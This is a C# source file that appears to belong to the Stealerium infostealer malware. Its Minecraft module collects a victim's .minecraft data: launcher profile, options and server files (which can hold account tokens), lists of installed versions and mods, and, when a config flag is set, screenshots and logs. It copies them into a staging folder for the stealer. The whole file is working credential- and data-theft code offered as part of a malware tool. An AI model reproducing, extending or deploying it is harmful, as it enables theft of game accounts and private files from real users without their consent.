using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Gaming;

internal sealed class Minecraft
{
	private static readonly string MinecraftPath = Path.Combine(Paths.Appdata, ".minecraft");

	private static void SaveVersions(string sSavePath)
	{
		try
		{
			string[] directories = Directory.GetDirectories(Path.Combine(MinecraftPath, "versions"));
			foreach (string path in directories)
			{
				string name = new DirectoryInfo(path).Name;
				string text = Filemanager.DirectorySize(path) + " bytes";
				string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\versions.txt", "VERSION: " + name + "\n\tSIZE: " + text + "\n\tDATE: " + text2 + "\n\n");
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Minecraft >> Failed collect installed versions\n" + ex);
		}
	}

	private static void SaveMods(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "mods"));
			foreach (string obj in files)
			{
				string fileName = Path.GetFileName(obj);
				string text = new FileInfo(obj).Length + " bytes";
				string text2 = File.GetCreationTime(obj).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\mods.txt", "MOD: " + fileName + "\n\tSIZE: " + text + "\n\tDATE: " + text2 + "\n\n");
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Minecraft >> Failed collect installed mods\n" + ex);
		}
	}

	private static void SaveScreenshots(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
			if (files.Length != 0)
			{
				Directory.CreateDirectory(sSavePath + "\\screenshots");
				string[] array = files;
				foreach (string text in array)
				{
					File.Copy(text, sSavePath + "\\screenshots\\" + Path.GetFileName(text));
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Minecraft >> Failed collect screenshots\n" + ex);
		}
	}

	private static void SaveFiles(string sSavePath)
	{
		try
		{
			string[] files = Directory.GetFiles(MinecraftPath);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				string text = fileInfo.Name.ToLower();
				if (text.Contains("profile") || text.Contains("options") || text.Contains("servers"))
				{
					fileInfo.CopyTo(Path.Combine(sSavePath, fileInfo.Name));
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Minecraft >> Failed collect profiles\n" + ex);
		}
	}

	private static void SaveLogs(string sSavePath)
	{
		try
		{
			string path = Path.Combine(MinecraftPath, "logs");
			string text = Path.Combine(sSavePath, "logs");
			if (!Directory.Exists(path))
			{
				return;
			}
			Directory.CreateDirectory(text);
			string[] files = Directory.GetFiles(path);
			for (int i = 0; i < files.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(files[i]);
				if (fileInfo.Length < Config.GrabberSizeLimit)
				{
					string text2 = Path.Combine(text, fileInfo.Name);
					if (!File.Exists(text2))
					{
						fileInfo.CopyTo(text2);
					}
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Minecraft >> Failed collect logs\n" + ex);
		}
	}

	public static void SaveAll(string sSavePath)
	{
		if (!Directory.Exists(MinecraftPath))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			SaveMods(sSavePath);
			SaveFiles(sSavePath);
			SaveVersions(sSavePath);
			if (!(Config.GrabberModule != "1"))
			{
				SaveLogs(sSavePath);
				SaveScreenshots(sSavePath);
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Minecraft >> Failed collect data\n" + ex);
		}
	}
}
